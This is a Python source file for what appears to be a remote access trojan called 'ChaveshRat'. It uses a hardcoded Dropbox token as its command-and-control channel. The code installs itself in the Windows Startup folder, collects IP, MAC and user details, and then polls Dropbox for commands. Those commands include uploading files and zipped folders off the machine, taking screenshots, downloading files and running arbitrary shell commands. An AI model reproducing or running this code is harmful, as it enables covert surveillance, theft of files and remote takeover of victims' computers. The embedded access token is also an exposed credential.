import dropbox,urllib,platform,os
from dropbox.files import WriteMode
from getmac import get_mac_address
from getpass import getuser
import shutil,requests
import zipfile,pymsgbox
import subprocess,pyautogui
# Access token
TOKEN = 'SkhRUxP1LEMAAAAAAAAAAQhZ66z3DIH1pMP_o1yan8B5ACMAWH6Wh465RZnP7ts6'
dbx = dropbox.Dropbox(TOKEN)



def upload_file_dbx(data,path,encoding=True) :

    if encoding == True :
        dbx.files_upload(bytes(data,'utf-8'), path, mode=WriteMode('overwrite'))  
    else :
        dbx.files_upload(data, path, mode=WriteMode('overwrite'))    
def gotostartup(usrname) :
    try :


        address = os.path.abspath(__file__)
        address = address[0:len(address) - 2 ] +"exe"
        res = shutil.copyfile(address, "C:/Users/"+usrname+"/Chavesh/main.exe")
        with open(f"C:/Users/{usrname}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.bat", "w") as f :
                f.write('@echo off\n"C:/Users/'+usrname+'/Chavesh/main.exe"\nexit')
                f.close()



	
			
    except Exception as e :
        upload_file_dbx(str(e),'/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')     


        

def Create_Start_Files() :

    ip = urllib.request.urlopen('http://ip.42.pl/raw').read().decode('utf-8')
    mac = get_mac_address()
    usrname = getuser()
    gotostartup(usrname)
    

    info  = 'Ip = '+ip+'\n'
    info += 'Mac = '+mac+'\n'
    info += 'os = '+platform.uname()[0]+''+platform.uname()[2]+' '+platform.architecture()[0]+'\n'
    info += 'ComputerName = '+platform.node()+'\n'
    info += 'UserName = '+usrname+'\n'
    info += 'system Type = '+platform.uname()[5]+'\n' 

    try :

        os.mkdir(f'C:/Users/{usrname}/Chavesh')   
        with open(f'C:/Users/{usrname}/Chavesh/node.txt','w') as f :
            f.write(info)
            f.close()   

    except FileExistsError :
         with open(f'C:/Users/{usrname}/Chavesh/node.txt','w') as f :
            f.write(info)
            f.close()  
    upload_file_dbx(info,'/ChaveshRat/'+platform.node()+'-'+usrname+'/node.txt') 
    upload_file_dbx('None','/ChaveshRat/'+platform.node()+'-'+usrname+'/ServerCommand.txt')                  


def Do_server_Commands() :
    usrname = getuser()
    Command = '/ChaveshRat/'+platform.node()+'-'+usrname+'/ServerCommand.txt'
       

    try :
           link_dl = dbx.files_get_temporary_link(Command)

           res = urllib.request.urlopen(link_dl.link).read().decode('utf-8')

           if res[0:5] == 'mkdir' :  # Make Directory

                if os.path.isdir(res[6:]) :
                   upload_file_dbx('Directory is Exsist','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')
                else :
                    os.mkdir(res[6:])   
                    upload_file_dbx('Directory Created','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')
           elif res[0:2] == 'mk' : # Make File
                if os.path.isdir(res[3:]) :
                   upload_file_dbx('File is Exsist','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')
                else :
                    open(res[3:],'a').close()   
                    upload_file_dbx('File Created','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')
           elif res[0:2] == 'rm' : # remove file

                if os.path.exists(res[3:]) :
                     os.remove(res[3:])   
                     upload_file_dbx('File Has Been Deleted','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')
                else :
                   
                    upload_file_dbx('File Not Exsist','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')   
           elif res[0:6] == 'deldir' :  # Remove Directory 

                if os.path.isdir(res[7:]) :
                     shutil.rmtree(res[7:]) 
                     upload_file_dbx('Directory Has Been Deleted','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')
                else :
                   
                    upload_file_dbx('Directory Not Exsist','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')    
           elif res[0:2] == 'dl' : # Download zip file
               url = res[3:]
               response = urllib.request.urlopen(url)
               response = response.url
               filename = os.path.basename(response)
               r = requests.get(url,allow_redirects=True)
               open(f'C:/Users/{usrname}/Chavesh/{filename}','wb').write(r.content)
               upload_file_dbx('File Downloaded','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt') 
           elif res[0:2] == 'up' :
               with open(res[3:],'rb') as f :
                   filename = os.path.basename(res[3:])
                   upload_file_dbx(f.read(),'/ChaveshRat/'+platform.node()+'-'+usrname+'/Download/'+filename,encoding=False)   
                   upload_file_dbx('On DropBox Uploaded','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt') 
           elif res[0:3] == 'uzf' :  # Upload folder and subfolders as Zip file
               filename = (os.path.basename(res[4:]))
               


              
               
               handle = zipfile.ZipFile(f'C:/Users/{usrname}/Chavesh/{filename}.zip','w')
               print('1')
               p = res[4:]
               
               file_path = []
               for r,d,f in os.walk(p) :
                    

                    for file in f :

                        file_name = r+'\\'+file
                        
                        file_path.append(file_name)

                    for file in file_path  :
                            handle.write(file,compress_type=zipfile.ZIP_DEFLATED) 
               handle.close()

               with open(f'C:/Users/{usrname}/Chavesh/{filename}.zip','rb') as f :

                    upload_file_dbx(f.read(),'/ChaveshRat/'+platform.node()+'-'+usrname+'/Download/'+filename+'.zip',encoding=False)   
                    upload_file_dbx('On DropBox Uploaded','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt') 
                    f.close()    

           elif res == 'info' :  # Info

                 info = dbx.files_get_temporary_link('/ChaveshRat/'+platform.node()+'-'+usrname+'/node.txt')

                 info = urllib.request.urlopen(info.link).read().decode('utf-8')
                 upload_file_dbx(info,'/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')
           elif res == 'online' :
               upload_file_dbx('online','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')    
           elif res[0:4] == 'shot'  :  # ScreenShot
                 myScreenshot = pyautogui.screenshot()
                 myScreenshot.save("C:/Users/"+usrname+"/Chavesh/ScreenShot.png")
                 with open(f"C:/Users/{usrname}/Chavesh/ScreenShot.png",'rb') as f :
                   filename = os.path.basename(f"C:/Users/{usrname}/Chavesh/ScreenShot.png")
                   upload_file_dbx(f.read(),'/ChaveshRat/'+platform.node()+'-'+usrname+'/Download/'+filename,encoding=False)   
                   upload_file_dbx('SCreenShot On DropBox Uploaded','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt') 

           elif res[0:7] == 'message' : # Send a Pop up Message 
               pymsgbox.alert(text=res[8:], title='Message', button='OK') 
               upload_file_dbx('Message Sent !','/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt') 
           elif res != 'None' :
               DEVNULL = subprocess.DEVNULL
               cmd=subprocess.check_output(res,shell=True, stderr = DEVNULL , stdin = DEVNULL )
               upload_file_dbx(cmd,'/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt',encoding=False)



        
    except Exception as e :
        upload_file_dbx(str(e),'/ChaveshRat/'+platform.node()+'-'+usrname+'/result.txt')    
        









Create_Start_Files()  


while True :
    try :
        Do_server_Commands()
    except :
        Do_server_Commands()    
